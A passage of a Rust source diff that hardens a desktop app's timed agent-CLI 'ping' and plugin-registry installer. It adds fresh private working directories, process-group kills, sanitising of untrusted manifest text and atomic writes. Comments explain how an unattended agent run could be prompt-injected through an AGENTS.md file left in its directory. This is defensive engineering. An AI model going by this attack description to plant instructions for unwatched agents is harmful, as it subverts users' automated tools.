+            Some(start)
+        }
         None => {
             if seen_window == 0 || now < seen_window {
                 return None;
@@ -3223,6 +3524,16 @@ fn window_start(
 /// being pinged twice: once while it reported nothing, then again a moment
 /// later when it began reporting the window our own ping had just started,
 /// still rounded to 0% used.
+///
+/// [`PING_MIN_INTERVAL_SECS`] sits under that comparison rather than beside
+/// it: whatever `window_start` says, and however `pinged_at` compares to it,
+/// nothing here fires again inside that floor. `pinged_at` itself is clamped
+/// to `now` first — a value from the future can only reach here from a
+/// hand-edited config.json, since nothing this app writes is ever ahead of
+/// its own clock, and unclamped it would read as "pinged just now" for as
+/// long as `now` takes to catch up to it, which for a wildly wrong edit could
+/// be a long time; clamped, it reads as exactly that from this call onward,
+/// which is the same state a real ping just having fired would leave.
 fn ping_due(
     used_percent: Option<f64>,
     resets_at: Option<u64>,
@@ -3232,13 +3543,22 @@ fn ping_due(
     now: u64,
 ) -> bool {
     // "Empty" has to mean *definitely* empty: no figure at all, or one that is
-    // zero. A NaN fails this comparison as it fails every other, and so counts
-    // as busy — a figure that cannot be read must never spend quota.
+    // exactly zero. A NaN fails this comparison as it fails every other, and
+    // so counts as busy — a figure that cannot be read must never spend
+    // quota. Not `<= 0.0`: both engines clamp a reported percentage to
+    // 0..100 before it ever reaches here, so negative is not a real reading
+    // to treat as extra-empty, only a bug somewhere upstream of this
+    // function — and a bug that quietly still fires the ping is the harder
+    // one to notice.
     let empty = match used_percent {
         None => true,
-        Some(used) => used <= 0.0,
+        Some(used) => used == 0.0,
     };
     if !empty {
+        return false;
+    }
+    let pinged_at = pinged_at.min(now);
+    if now.saturating_sub(pinged_at) < PING_MIN_INTERVAL_SECS {
         return false;
     }
     let period = period_minutes
@@ -3498,12 +3818,18 @@ fn provider_data_from_reading(
             notice: ss(&notice),
             ..Default::default()
         },
+        // `error` is not this app's own text in general — a manifest's
+        // `reject-when` message, a keychain `service` name, or a
+        // `no_credentials_message` all reach it verbatim from the manifest
+        // that declared them, the same class of untrusted string
+        // `sanitize_provider_text` exists to strip control/bidi characters
+        // and cap the length of before anything draws it.
         Some(msg) => ProviderData {
             name,
             tag,
             account,
             status: 1,
-            message: ss(msg),
+            message: ss(tickover::plugin::sanitize_provider_text(msg)),
             ..Default::default()
         },
     }
@@ -3996,6 +4322,23 @@ fn refresh_plugins_model(plugin_model: &PluginRows, plugins: &[PluginManifest]) 
     plugin_model.set_vec(plugins.iter().map(plugin_row).collect::<Vec<_>>());
 }
 
+/// One argument of a displayed command line, quoted when it needs to be —
+/// An arg containing whitespace, joined with the others by a bare space,
+/// reads as more than one argument (`["say", "hello world"]` would show as
+/// indistinguishable from `["say", "hello", "world"]`, three args pretending
+/// to be two). Quoted whenever the arg has whitespace *or* already carries a
+/// `"` of its own — the latter without escaping it first would let one
+/// argument's quote mark appear to close another's. Display only: this never
+/// feeds a shell or a process spawn, which take `ping.args` as the `Vec`
+/// [`std::process::Command`] already keeps each element of, verbatim.
+fn quote_command_arg(arg: &str) -> String {
+    if arg.chars().any(|c| c.is_whitespace() || c == '"') {
+        format!("\"{}\"", arg.replace('"', "\\\""))
+    } else {
+        arg.to_string()
+    }
+}
+
 /// A `[ping]` rendered as the command line it will actually run. The toggle
 /// that fires it is a checkbox in Settings, and a checkbox that says "ping"
 /// while running something else is how a third-party manifest would get a
@@ -4004,7 +4347,13 @@ fn ping_command_line(ping: &manifest::PingConfig) -> String {
     if ping.args.is_empty() {
         ping.bin.clone()
     } else {
-        format!("{} {}", ping.bin, ping.args.join(" "))
+        let args = ping
+            .args
+            .iter()
+            .map(|a| quote_command_arg(a))
+            .collect::<Vec<_>>()
+            .join(" ");
+        format!("{} {args}", ping.bin)
     }
 }
 
@@ -4790,34 +5139,83 @@ fn cli_path_env() -> Option<std::ffi::OsString> {
     std::env::join_paths(dirs).ok()
 }
 
-/// The directory the ping's command runs in: an empty one this app owns,
-/// beside the plugins folder.
+/// A directory name unique to this one ping run: no two calls, even from the
+/// same process in the same nanosecond, resolve to the same path. Mirrors
+/// `config::test_scratch_path`'s own reasoning (pid, then nanoseconds, then a
+/// counter, each closing the gap the one before it leaves open) — this is the
+/// same problem `ping_cwd` has, one directory per run rather than one config
+/// file per test thread.
+fn unique_ping_workdir_name() -> String {
+    use std::sync::atomic::{AtomicU64, Ordering};
+    static SEQ: AtomicU64 = AtomicU64::new(0);
+    format!(
+        "tickover-ping-{}-{}-{}",
+        std::process::id(),
+        std::time::SystemTime::now()
+            .duration_since(std::time::UNIX_EPOCH)
+            .map(|d| d.as_nanos())
+            .unwrap_or(0),
+        SEQ.fetch_add(1, Ordering::Relaxed),
+    )
+}
+
+/// Create `dir` (and any missing parent) fresh — `0o700` on unix, atomically
+/// at creation rather than restricted afterwards, so there is no window in
+/// which it sits at the OS default and readable by anything else this user
+/// runs. Nothing is ever written into it today; the mode is what keeps that
+/// true if some future CLI ever does, rather than relying on it staying
+/// accidentally so.
+fn create_ping_workdir(dir: &std::path::Path) -> std::io::Result<()> {
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::DirBuilderExt;
+        std::fs::DirBuilder::new()
+            .recursive(true)
+            .mode(0o700)
+            .create(dir)
+    }
+    #[cfg(not(unix))]
+    {
+        std::fs::create_dir_all(dir)
+    }
+}
+
+/// The directory the ping's command runs in: a fresh, empty one this app owns
+/// and nobody else has had a chance to put anything into, created new for
+/// this one run and removed by [`spawn_hello`] once it ends.
 ///
-/// Not the home directory, which is where it used to run. These CLIs read the
+/// Not the home directory, or any descendant of it. These CLIs read the
 /// directory they start in — `codex exec` picks up `AGENTS.md` from it as
 /// instructions — and the ping is a model run on a timer that nobody is
 /// watching and whose output is discarded. Handing it the home directory's
-/// contents as instructions is the ideal setup for a prompt injection; handing
-/// it an empty directory gives it nothing to read.
+/// contents (or a stray `AGENTS.md` some other program already left in a
+/// *reused* working directory) as instructions is the ideal setup for a
+/// prompt injection; a directory created fresh moments ago, under the OS temp
+/// dir, gives it nothing to read that this run didn't put there itself —
+/// which today is nothing at all.
 ///
-/// Falls back to a fresh directory under the OS temp dir if the one beside
-/// the plugins folder can't be created (also empty, also this app's own), and
-/// to `None` — skip the ping, do not run it anywhere — if even that fails.
-/// The home directory is never an acceptable fallback here: it is the exact
-/// surface this function exists to keep an unwatched, output-discarded run
-/// away from, so a filesystem wedged enough to defeat both attempts must lose
-/// the ping rather than quietly reopen the hole this replaced.
+/// Falls back to a fresh directory beside the plugins folder if the OS temp
+/// directory itself can't be created into (unlikely — temp_dir() is the one
+/// location almost every process can always write to — but a wedged
+/// filesystem is not impossible), and to `None` — skip the ping, do not run
+/// it anywhere — if even that fails. The old, single, *reused* `ping-workdir`
+/// this app used to run every ping from is gone: reusing one directory across
+/// runs is exactly the "an AGENTS.md left there is read" gap a fresh one per
+/// run closes.
 fn ping_cwd() -> Option<std::path::PathBuf> {
-    let dir = seed::plugins_dir().with_file_name("ping-workdir");
-    if std::fs::create_dir_all(&dir).is_ok() {
-        return Some(dir);
+    let name = unique_ping_workdir_name();
+    let primary = std::env::temp_dir().join(&name);
+    if create_ping_workdir(&primary).is_ok() {
+        return Some(primary);
     }
-    let fallback = std::env::temp_dir().join("tickover-ping-workdir");
-    match std::fs::create_dir_all(&fallback) {
+    let fallback = seed::plugins_dir()
+        .with_file_name("ping-workdir")
+        .join(&name);
+    match create_ping_workdir(&fallback) {
         Ok(()) => {
             diag::line(format!(
                 "auto-ping: {} unavailable, using {} instead",
-                dir.display(),
+                primary.display(),
                 fallback.display()
             ));
             Some(fallback)
@@ -4849,8 +5247,7 @@ const PING_STDERR_MAX: usize = 2000;
 /// Cut by **characters**, not bytes: replacing an invalid byte with `U+FFFD`
 /// makes the lossy decode longer than the bytes it read, so a byte-indexed
 /// `String::truncate` could land inside a character — which panics, in a
-/// thread whose whole job is reporting that something else went wrong. And a
-/// panic here is not a lost log line: this crate builds with `panic = "abort"`.
+/// thread whose whole job is reporting that something else went wrong.
 ///
 /// Newlines become `⏎` so one failure stays one line: the log is grepped, and
 /// its trimming counts on a record being a line.
@@ -4874,8 +5271,42 @@ enum RunOutcome {
     Unwaitable(std::io::Error),
 }
 
-/// Wait for `child`, killing it if it outlives `deadline`. Returns how it
-/// ended, plus up to [`PING_STDERR_MAX`] bytes of the **tail** of its stderr.
+/// Kill `child` and, on unix, everything else sharing its process group —
+/// which is only ever the group [`spawn_hello`] put it in alone via
+/// `process_group(0)` at spawn time, pgid equal to its own pid. A plain
+/// `child.kill()` only ever reaches that one direct process; an agent CLI
+/// that shells out to a sub-process to do the actual model call leaves that
+/// sub-process running (and, on the log-file engines, still writing to the
+/// very file this app is polling) long after this function returns. Signaling
+/// the negative of the pid is what `kill(2)` defines as "the whole group"
+/// rather than "the one process" — safe here specifically because
+/// `process_group(0)` guarantees this pid *is* that group's id, not merely
+/// happens to be for now.
+///
+/// Windows has no such signal in `std`, nor a job object this app creates for
+/// the ping — `child.kill()` there always was, and still is, direct-child
+/// only. A hung grandchild on Windows outlives the deadline; there is nothing
+/// in the standard library this function can reach for to change that
+/// without taking on a job-object dependency for one CLI ping.
+fn kill_process_tree(child: &mut std::process::Child) {
+    #[cfg(unix)]
+    {
+        let pid = child.id() as libc::pid_t;
+        // SAFETY: `kill` with a valid pid and a fixed, always-defined signal
+        // number has no memory-safety contract to uphold — the "unsafe" here
+        // is FFI, not aliasing or lifetimes. Its error case (already exited,
+        // or the pid was reused since) is exactly what `child.wait()` right
+        // after this call already handles either way.
+        unsafe {
+            libc::kill(-pid, libc::SIGKILL);
+        }
+    }
+    let _ = child.kill();
+}
+
+/// Wait for `child`, killing it (and, on unix, its whole process group — see
+/// [`kill_process_tree`]) if it outlives `deadline`. Returns how it ended,
+/// plus up to [`PING_STDERR_MAX`] bytes of the **tail** of its stderr.
 ///
 /// Split out from [`spawn_hello`] so the three things that are easy to get
 /// wrong here — the deadline, the drain, and which end of the output is kept
@@ -4944,7 +5375,7 @@ fn run_with_deadline(mut child: std::process::Child, deadline: Duration) -> (Run
                 if let Ok(Some(status)) = child.try_wait() {
                     break RunOutcome::Exited(status);
                 }
-                let _ = child.kill();
+                kill_process_tree(&mut child);
                 break match child.wait() {
                     Ok(status) if status.success() => RunOutcome::Exited(status),
                     _ => RunOutcome::Killed,
@@ -4956,8 +5387,9 @@ fn run_with_deadline(mut child: std::process::Child, deadline: Duration) -> (Run
             Ok(None) => std::thread::sleep(Duration::from_millis(250)),
             Err(e) => {
                 // Whatever went wrong asking after it, this process started
-                // it: end it and reap it rather than leave it behind.
-                let _ = child.kill();
+                // it: end it (and, on unix, whatever it started) and reap it
+                // rather than leave it behind.
+                kill_process_tree(&mut child);
                 let _ = child.wait();
                 break RunOutcome::Unwaitable(e);
             }
@@ -4993,15 +5425,30 @@ fn spawn_hello(bin: std::path::PathBuf, args: Vec<String>) {
     // that call site's own comment), same as if the command inside had failed
     // to start.
     let bin_for_log = bin.clone();
+    // Cloned rather than moved: `cwd` already exists on disk by this point
+    // (`ping_cwd` created it), and if the thread below never runs at all —
+    // the one failure a moved value can't clean up after itself from — this
+    // is what removes it instead of leaking one directory per failed spawn.
+    let cwd_for_cleanup = cwd.clone();
     if let Err(e) = std::thread::Builder::new().spawn(move || {
         let mut cmd = std::process::Command::new(&bin);
         cmd.args(&args)
-            .current_dir(cwd)
+            .current_dir(&cwd)
             .stdin(std::process::Stdio::null())
             .stdout(std::process::Stdio::null())
             .stderr(std::process::Stdio::piped());
         if let Some(path) = path {
             cmd.env("PATH", path);
+        }
+        // Its own process group, pgid == its own pid — what lets
+        // `run_with_deadline`'s force-kill reach a grandchild (an agent CLI
+        // that shells out to do the actual model call) instead of only ever
+        // the direct child. `0` here means "use the child's own future pid",
+        // not "join this app's own group" — nothing else already runs there.
+        #[cfg(unix)]
+        {
+            use std::os::unix::process::CommandExt;
+            cmd.process_group(0);
         }
         diag::line(format!(
             "auto-ping: running {} {}",
@@ -5012,6 +5459,9 @@ fn spawn_hello(bin: std::path::PathBuf, args: Vec<String>) {
             Ok(child) => child,
             Err(e) => {
                 diag::line(format!("auto-ping: {} did not start: {e}", bin.display()));
+                // Fresh per run: nothing reads or writes it after this,
+                // command or no command, so it goes with the run that made it.
+                let _ = std::fs::remove_dir_all(&cwd);
                 return;
             }
         };
@@ -5043,11 +5493,13 @@ fn spawn_hello(bin: std::path::PathBuf, args: Vec<String>) {
                 ));
             }
         }
+        let _ = std::fs::remove_dir_all(&cwd);
     }) {
         diag::line(format!(
             "auto-ping: {} could not start the thread to run it: {e}",
             bin_for_log.display()
         ));
+        let _ = std::fs::remove_dir_all(&cwd_for_cleanup);
     }
 }
 
@@ -5230,12 +5682,20 @@ fn fold_registry_diff(
 /// One not-yet-installed registry entry as a `registry-new` row: `status =
 /// 0` (available) with no error — [`set_registry_row_status`] is what moves
 /// it to installing/failed once the user actually clicks Install.
+///
+/// `name`/`description` come from `index.toml` on whatever host serves this
+/// registry, not from the manifest being installed — the same untrusted class
+/// [`tickover::plugin::sanitize_provider_text`] exists for. Any length cap
+/// belongs to `RegistryIndex::validate` at load time, not here; this is only
+/// the control/bidi stripping every other sink of response-fed text gets.
 fn registry_entry_row(entry: &RegistryEntry) -> RegistryPluginRow {
     RegistryPluginRow {
         id: ss(&entry.id),
-        name: ss(&entry.name),
+        name: ss(tickover::plugin::sanitize_provider_text(&entry.name)),
         version: ss(&entry.version),
-        description: ss(entry.description.as_deref().unwrap_or_default()),
+        description: ss(tickover::plugin::sanitize_provider_text(
+            entry.description.as_deref().unwrap_or_default(),
+        )),
         status: 0,
         error: ss(""),
     }
@@ -5283,10 +5743,17 @@ fn apply_registry_check(
                 .iter()
                 .filter_map(|m| {
                     let path = find_plugin_manifest_path(&dir, &m.id)?;
-                    let bytes = std::fs::read(&path).ok()?;
+                    // Bounded and FIFO-safe, the same as every other manifest
+                    // read: this path came out of the plugins folder, exactly
+                    // as reachable by another program as any third-party
+                    // manifest is.
+                    let text = tickover::plugin::read_regular_file(
+                        &path,
+                        tickover::plugin::SMALL_FILE_MAX_BYTES,
+                    )?;
                     Some((
                         m.id.clone(),
-                        registry::sha256_hex(&bytes),
+                        registry::sha256_hex(text.as_bytes()),
                         m.version.clone(),
                     ))
                 })
@@ -5434,13 +5901,19 @@ enum PendingKind {
 /// contract: hash-check first, parse second) — nothing is ever written to
 /// disk in that case. `manifest` is boxed: `PluginManifest` is large enough
 /// that an inlined `Ready` variant would otherwise force the same stack/heap
-/// footprint onto every `Failed` value too.
+/// footprint onto every `Failed` value too. `base_url` is the registry
+/// this manifest was actually resolved and fetched against — carried so
+/// `handle_install_outcome` records *that* origin in the lockfile rather than
+/// [`DEFAULT_REGISTRY_URL`] on the unstated assumption that it is always the
+/// one a fetch ran against; today it is the only registry this app knows how
+/// to check, but the two are no longer the same fact by construction.
 enum InstallOutcome {
     Failed(String),
     Ready {
         raw_bytes: Vec<u8>,
         manifest: Box<PluginManifest>,
         sha_hex: String,
+        base_url: String,
     },
 }
 
@@ -5456,6 +5929,11 @@ enum InstallOutcome {
 /// click for it a silent no-op. `Builder::spawn` itself failing — never
 /// reaching this guard at all — is the one failure it cannot cover; its own
 /// call sites handle that the same way [`spawn_plugin_fetch`] does.
+///
+/// Same caveat as [`FetchGuard`]: this only runs under unwinding. This
+/// crate's release profile does not set `panic = "abort"`, so a panic on the
+/// worker thread unwinds and reaches `drop` in the shipped binary the same
+/// way it does under `cargo test`.
 struct RegistryGuard {
     kind: PendingKind,
     /// Taken by whichever of [`RegistryGuard::finish`] and `drop` runs first,
@@ -5521,6 +5999,7 @@ fn fetch_and_verify_manifest(base_url: &str, entry: &RegistryEntry) -> InstallOu
                 raw_bytes,
                 manifest: Box::new(manifest),
                 sha_hex,
+                base_url: base_url.to_string(),
             },
             Err(e) => InstallOutcome::Failed(e),
         },
@@ -5557,24 +6036,62 @@ fn verify_manifest_id_matches_entry(
 }
 
 /// Write a freshly-verified registry manifest for a *new* install:
-/// `<dir>/<id>.toml`, refusing to clobber an existing file (`create_new`) —
-/// the same write shape as `add-plugin`'s own, including the canonical-
-/// containment check via [`plugin_manifest_target`]. `id` is the *parsed*
-/// manifest's own id — [`verify_manifest_id_matches_entry`] guarantees this
-/// is always the same string as the registry entry's own `id` (the one the
-/// user actually clicked Install on) by the time this is called, so an
-/// install always ends up writing under the id shown in the UI — this is
-/// what ends up on disk and is what every later reload/diff addresses the
-/// plugin by.
+/// `<dir>/<id>.toml`, refusing to clobber an existing file — including the
+/// canonical-containment check via [`plugin_manifest_target`]. `id` is the
+/// *parsed* manifest's own id — [`verify_manifest_id_matches_entry`]
+/// guarantees this is always the same string as the registry entry's own
+/// `id` (the one the user actually clicked Install on) by the time this is
+/// called, so an install always ends up writing under the id shown in the UI
+/// — this is what ends up on disk and is what every later reload/diff
+/// addresses the plugin by.
+///
+/// Writes to a sibling temp file first, `create_new` (never a bare
+/// `open().create_new()` on `target` itself, which this used to be) — a
+/// disk-full or a crash partway through `write_all` used to leave a
+/// truncated manifest sitting at `target`, and `create_new` on a *second*
+/// attempt would then refuse to touch it: a bad write got permanently stuck
+/// rather than retried. The temp file is renamed over `target` only once it
+/// holds every byte, and only when nothing is there already — the same
+/// existence check `add-plugin`'s own inline write leans on `create_new` for
+/// directly (see its own comment on why that shape is TOCTOU-safe there);
+/// here the check is a plain `symlink_metadata` read immediately before the
+/// `rename`, not the rename's own atomicity — `rename` replaces whatever
+/// directory entry is at `target` at that instant (a symlink included, as
+/// the entry itself, never through it) rather than opening and writing
+/// through one, so the residual race this leaves is "another process created
+/// an ordinary file at this exact path in the instant between the check and
+/// the rename", not "an attacker's symlink gets written through" — the same
+/// risk [`update_write`]'s unconditional rename already accepts for a target
+/// it means to overwrite anyway.
 fn install_write(dir: &std::path::Path, id: &str, raw_bytes: &[u8]) -> Result<(), String> {
     let target = plugin_manifest_target(dir, id)
         .ok_or_else(|| format!("plugin id \"{id}\" is not a valid filename"))?;
-    std::fs::OpenOptions::new()
+    let mut tmp_name = target.file_name().unwrap_or_default().to_os_string();
+    tmp_name.push(format!(".tmp{}", std::process::id()));
+    let tmp = target.with_file_name(tmp_name);
+    // Same predictable-temp-path reasoning as `update_write`: whatever is
+    // already sitting at `tmp` goes first, then `create_new` is what actually
+    // makes the file, so a symlink planted there is removed rather than
+    // followed and overwritten.
+    let _ = std::fs::remove_file(&tmp);
+    let result = std::fs::OpenOptions::new()
         .write(true)
         .create_new(true)
-        .open(&target)
+        .open(&tmp)
         .and_then(|mut f| std::io::Write::write_all(&mut f, raw_bytes))
-        .map_err(|e| e.to_string())
+        .and_then(|_| {
+            if target.symlink_metadata().is_ok() {
+                return Err(std::io::Error::new(
+                    std::io::ErrorKind::AlreadyExists,
+                    format!("{} already exists", target.display()),
+                ));
+            }
+            std::fs::rename(&tmp, &target)
+        });
+    if result.is_err() {
+        let _ = std::fs::remove_file(&tmp); // best-effort cleanup of a half-written temp file
+    }
+    result.map_err(|e| e.to_string())
 }
 
 /// Overwrite an already-installed plugin's manifest with a freshly-verified
@@ -5616,6 +6133,25 @@ fn update_write(dir: &std::path::Path, id: &str, raw_bytes: &[u8]) -> Result<(),
     result.map_err(|e| e.to_string())
 }
 
+/// Whether it is still safe for [`handle_install_outcome`] to run
+/// `update_write` over the file it is about to replace. `recorded_sha256` is
+/// the lockfile's `origin_sha256` for this id, if any; `current_sha256` is
+/// what's on disk right now, recomputed immediately before the write. `None`
+/// (no lockfile entry) means true unconditionally — nothing recorded to
+/// compare against, which is exactly the plugin-installed-by-hand-or-before-
+/// the-lockfile-existed case `registry::diff_installed` already offers as an
+/// update regardless of local edits; refusing here too would make such a
+/// plugin permanently un-updatable through this button. A recorded value
+/// that still matches means nothing changed since "Check updates" looked;
+/// a mismatch means a hand-edit (or anything else) landed on the file during
+/// the network fetch and trust-dialog wait between that check and this write
+/// actually reaching disk, and overwriting it now would discard that edit
+/// silently — the one gap `has_local_edits` warns about at check time but
+/// cannot, by itself, catch happening later.
+fn update_target_unchanged(recorded_sha256: Option<&str>, current_sha256: &str) -> bool {
+    recorded_sha256.is_none_or(|recorded| recorded.eq_ignore_ascii_case(current_sha256))
+}
+
 /// Apply one install/update's fetch+verify result: run the trust dialog when
 /// `analyze_trust` requires it, write the verified bytes to disk, record
 /// provenance in the lockfile, and (for an install) drop the plugin off
@@ -5633,7 +6169,7 @@ fn handle_install_outcome(
     plugin_model: &PluginRows,
     registry_model: &RegistryRows,
 ) -> bool {
-    let (raw_bytes, manifest, sha_hex) = match outcome {
+    let (raw_bytes, manifest, sha_hex, base_url) = match outcome {
         InstallOutcome::Failed(err) => {
             diag::line(format!("{kind:?} \"{}\": {err}", entry.id));
             match kind {
@@ -5648,7 +6184,8 @@ fn handle_install_outcome(
             raw_bytes,
             manifest,
             sha_hex,
-        } => (raw_bytes, manifest, sha_hex),
+            base_url,
+        } => (raw_bytes, manifest, sha_hex, base_url),
     };
 
     let allowed_hosts = all_allowed_hosts(&manifest);
@@ -5666,6 +6203,32 @@ fn handle_install_outcome(
     }
 
     let dir = seed::plugins_dir();
+    let lock_path = registry::lockfile_path();
+    let mut lock = registry::load_lockfile(&lock_path);
+
+    if kind == PendingKind::Update {
+        // Recomputed now, immediately before the write, rather than trusted
+        // from whatever "Check updates" saw: that check can be arbitrarily
+        // old by the time a background fetch, sha256 verification and a
+        // possible trust dialog all finish. `None` here — no readable
+        // installed file — is left for `update_write` itself to report
+        // ("no installed manifest file found for id"); this only refuses a
+        // write when there IS a file and it no longer matches the lockfile.
+        let current_sha256 = find_plugin_manifest_path(&dir, &entry.id).and_then(|path| {
+            tickover::plugin::read_regular_file(&path, tickover::plugin::SMALL_FILE_MAX_BYTES)
+                .map(|text| registry::sha256_hex(text.as_bytes()))
+        });
+        if let Some(current_sha256) = current_sha256 {
+            let recorded = lock.get(&entry.id).map(|e| e.origin_sha256.as_str());
+            if !update_target_unchanged(recorded, &current_sha256) {
+                let msg = "the installed file changed since the last check — not overwriting it";
+                diag::line(format!("{kind:?} \"{}\": {msg}", entry.id));
+                set_plugin_update_status(plugin_model, plugins, &entry.id, 2, msg);
+                return false;
+            }
+        }
+    }
+
     let (write_result, lock_id): (Result<(), String>, &str) = match kind {
         PendingKind::Install => (
             install_write(&dir, &manifest.id, &raw_bytes),
@@ -5687,12 +6250,10 @@ fn handle_install_outcome(
         return false;
     }
 
-    let lock_path = registry::lockfile_path();
-    let mut lock = registry::load_lockfile(&lock_path);
     lock.set(
         lock_id,
         registry::RegistryLockEntry {
-            origin_registry_url: DEFAULT_REGISTRY_URL.to_string(),
+            origin_registry_url: base_url,
             origin_version: entry.version.clone(),
             origin_sha256: sha_hex,
             installed_at: now_unix(),
@@ -5763,12 +6324,69 @@ fn auth_type_label(kind: manifest::AuthType) -> &'static str {
 }
 
 /// `["a", "b", "c"]` as `"a, b and c"` — a list a person reads, not one a
-/// program prints.
+/// program prints. No comma before the final "and", for two items same as
+/// for more: `["a", "b"]` reads as `"a and b"`, never `"a, and b"`.
 fn join_with_and(parts: &[String]) -> String {
     match parts {
         [] => String::new(),
         [only] => only.clone(),
-        [rest @ .., last] => format!("{}, and {last}", rest.join(", ")),
+        [rest @ .., last] => format!("{} and {last}", rest.join(", ")),
+    }
+}
+
+/// The most characters one manifest-supplied item may contribute to a trust
+/// dialog line before [`sanitize_trust_item`] cuts it short with `…` — a
+/// dialog line is meant to be read, not grown to whatever length a hostile
+/// manifest cares to spell out. Counted in `char`s, not bytes, so the cut
+/// point never lands inside a multi-byte character.
+const TRUST_ITEM_MAX_CHARS: usize = 120;
+
+/// Sanitise one manifest-supplied string before it reaches a trust dialog on
+/// either platform. [`applescript_escape`] only keeps a string from breaking
+/// out of the AppleScript literal it's interpolated into — it runs on macOS
+/// alone, and it has no opinion on a character that quotes fine but still
+/// rewrites how the line *looks*. This is that opinion, shared by both
+/// platforms:
+/// * C0 controls and DEL (`applescript_escape` already turns these into a
+///   space for its own reason; the Windows `MessageBoxW` arm never calls
+///   that function at all, so without this they'd reach it raw);
+/// * U+2028/U+2029 (LINE/PARAGRAPH SEPARATOR) — a line break
+///   `applescript_escape`'s `'\n'` match never catches, since neither is the
+///   ASCII newline it matches on;
+/// * the bidi control characters (U+200E/U+200F, U+202A–U+202E,
+///   U+2066–U+2069) — invisible on their own, but able to make a dialog
+///   *display* a string in an order its bytes don't have, up to hiding one
+///   sentence behind the visual shape of another.
+///
+/// Every one of those is turned into a space, then every run of whitespace
+/// (including the ones this just produced) collapses to a single space and
+/// the ends are trimmed, and the result is capped at
+/// [`TRUST_ITEM_MAX_CHARS`] characters plus `…`.
+///
+/// Applied to every manifest-supplied item [`build_trust_message`] renders —
+/// the ping command line, each `local_files`/`credential_sources` entry,
+/// each host, and the plugin id itself — never to the assembled `short`/
+/// `detailed` strings afterwards: those are deliberately `\n`-separated
+/// labelled lines, and collapsing whitespace across the whole message would
+/// destroy that layout along with whatever it was sanitising.
+fn sanitize_trust_item(s: &str) -> String {
+    let mut cleaned = String::with_capacity(s.len());
+    for ch in s.chars() {
+        let strip = matches!(ch,
+            '\u{0}'..='\u{1F}' | '\u{7F}'
+            | '\u{2028}' | '\u{2029}'
+            | '\u{200E}' | '\u{200F}'
+            | '\u{202A}'..='\u{202E}'
+            | '\u{2066}'..='\u{2069}'
+        );
+        cleaned.push(if strip { ' ' } else { ch });
+    }
+    let collapsed = cleaned.split_whitespace().collect::<Vec<_>>().join(" ");
+    if collapsed.chars().count() <= TRUST_ITEM_MAX_CHARS {
+        collapsed
+    } else {
+        let truncated: String = collapsed.chars().take(TRUST_ITEM_MAX_CHARS).collect();
+        format!("{truncated}…")
     }
 }
 
@@ -5779,12 +6397,16 @@ fn join_with_and(parts: &[String]) -> String {
 /// and the fixed `redirects(0)` guarantee — see `registry::fetch_bytes`'s own
 /// docs (the function this trust dialog gates a manifest download through)
 /// for why that's always zero). Pure, so the wording is testable
-/// without any dialog on screen at all — see [`show_trust_dialog`].
+/// without any dialog on screen at all — see [`show_trust_dialog`]. Every
+/// manifest-supplied string that lands in either returned string has gone
+/// through [`sanitize_trust_item`] first — see that function's own doc for
+/// why a dialog needs more than `applescript_escape`'s quoting.
 fn build_trust_message(
     id: &str,
     disclosure: &TrustDisclosure,
     allowed_hosts: &[String],
 ) -> (String, String) {
+    let id = sanitize_trust_item(id);
     let auth_chain = disclosure
         .auth_types
         .iter()
@@ -5792,31 +6414,57 @@ fn build_trust_message(
         .collect::<Vec<_>>()
         .join(" → ");
     let engine = engine_label(disclosure.engine);
+    let ping = disclosure.ping.as_deref().map(sanitize_trust_item);
+    let local_files: Vec<String> = disclosure
+        .local_files
+        .iter()
+        .map(|f| sanitize_trust_item(f))
+        .collect();
+    let credential_sources: Vec<String> = disclosure
+        .credential_sources
+        .iter()
+        .map(|c| sanitize_trust_item(c))
+        .collect();
 
     // The first pass is a screen somebody can approve from without opening
     // the second, so it names *every* thing this manifest does that is worth
     // stopping for — strongest first, because a command that runs is worse
-    // news than a file that is read.
+    // news than a file that is read. The credential-chain and
+    // credential-source clauses sit next to each other on purpose, even
+    // though the source names a specific variable/service and so is
+    // stronger news than a bare file path: they're one thought (what reads
+    // a credential, then specifically what it reads), not two independent
+    // severities to rank against `local_files`.
     let mut does: Vec<String> = Vec::new();
-    if let Some(cmd) = &disclosure.ping {
+    if let Some(cmd) = &ping {
         does.push(format!(
             "runs a command after a quota window resets ({cmd})"
         ));
     }
-    if !disclosure.local_files.is_empty() {
-        does.push(format!(
-            "reads local files ({})",
-            disclosure.local_files.join(", ")
-        ));
+    if !local_files.is_empty() {
+        does.push(format!("reads local files ({})", local_files.join(", ")));
     }
     if !disclosure.auth_types.is_empty() {
         does.push(format!("reads a stored credential ({auth_chain})"));
     }
-    if !disclosure.untrusted_hosts.is_empty() {
+    if !credential_sources.is_empty() {
+        // The gap this closes: the clause above already names the auth
+        // chain's step *kinds* ("env"), which is exactly the disclosure a
+        // registry manifest reading `AWS_SECRET_ACCESS_KEY` used to hide
+        // behind. This names what each store-backed-by-something-other-
+        // than-a-file step actually reads.
         does.push(format!(
-            "sends to {}",
-            disclosure.untrusted_hosts.join(", ")
+            "reads a credential from {}",
+            credential_sources.join(", ")
         ));
+    }
+    if !disclosure.untrusted_hosts.is_empty() {
+        let untrusted: Vec<String> = disclosure
+            .untrusted_hosts
+            .iter()
+            .map(|h| sanitize_trust_item(h))
+            .collect();
+        does.push(format!("sends to {}", untrusted.join(", ")));
     }
     if does.is_empty() {
         does.push(format!("runs on the {engine} engine"));
@@ -5833,14 +6481,15 @@ fn build_trust_message(
             .dest_hosts
             .iter()
             .map(|h| {
+                let display = sanitize_trust_item(h);
                 if disclosure
                     .untrusted_hosts
                     .iter()
                     .any(|u| u.eq_ignore_ascii_case(h))
                 {
-                    format!("{h} (untrusted)")
+                    format!("{display} (untrusted)")
                 } else {
-                    h.clone()
+                    display
                 }
             })
             .collect::<Vec<_>>()
@@ -5849,22 +6498,29 @@ fn build_trust_message(
     let allowed = if allowed_hosts.is_empty() {
         "(none declared)".to_string()
     } else {
-        allowed_hosts.join(", ")
+        allowed_hosts
+            .iter()
+            .map(|h| sanitize_trust_item(h))
+            .collect::<Vec<_>>()
+            .join(", ")
     };
 
-    let local_files = if disclosure.local_files.is_empty() {
+    let local_files_line = if local_files.is_empty() {
         "(none)".to_string()
     } else {
-        disclosure.local_files.join(", ")
+        local_files.join(", ")
     };
-    let runs = disclosure
-        .ping
-        .clone()
-        .unwrap_or_else(|| "(nothing)".to_string());
+    let credential_sources_line = if credential_sources.is_empty() {
+        "(none)".to_string()
+    } else {
+        credential_sources.join(", ")
+    };
+    let runs = ping.clone().unwrap_or_else(|| "(nothing)".to_string());
 
     let detailed = format!(
